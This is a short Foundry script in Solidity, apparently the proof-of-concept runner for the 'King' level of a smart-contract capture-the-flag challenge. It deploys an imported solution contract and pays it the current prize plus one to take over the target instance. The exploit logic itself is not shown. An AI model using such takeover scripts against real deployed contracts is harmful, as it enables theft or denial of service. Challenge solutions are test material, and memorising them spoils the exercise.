// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Script.sol";
import "../src/interfaces/9_IKing.sol";
import "../src/9_KingSolution.sol";

contract KingPOCScript is Script {
    IKing instance = IKing(INSTANCE);

    function run() external {
        vm.startBroadcast();

        KingSolution solution = new KingSolution();
        solution.solve{value: instance.prize() + 1}();

        vm.stopBroadcast();
    }
}
